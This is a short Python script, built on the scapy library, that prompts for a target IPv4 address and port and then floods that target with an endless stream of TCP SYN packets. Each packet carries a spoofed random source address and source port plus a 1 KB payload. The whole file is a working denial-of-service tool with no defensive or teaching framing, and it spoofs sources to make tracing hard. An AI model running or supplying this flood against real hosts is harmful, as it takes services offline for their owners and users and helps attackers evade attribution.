# coding: utf-8
import random
from scapy.all import *

def takeInput():
    global PORT
    try:
        PORT = int(input("Port: "))
    except ValueError:
        print("Please specify an Integer")
        takeInput()
    takeInput2()

def takeInput2():
    global SERVER
    SERVER = input("Server: ")
    if len(SERVER.split(".")) != 4:
        print("Invalid IPv4 address (note: IPv6 is not allowed)")
        takeInput2()

def syn_flood(server_ip, server_port):
    src_port = RandShort()

    ip_layer = IP(src=RandIP("192.168.1.1/24"), dst=server_ip)
    tcp_layer = TCP(sport=RandShort(), dport=server_port, flags="S")
    raw_layer = Raw(b"X"*1024)

    syn_packet = ip_layer / tcp_layer / raw_layer

    send(syn_packet, loop=1, verbose=0)

def main():
    takeInput()
    syn_flood(SERVER, PORT)

if __name__ == '__main__':
    main()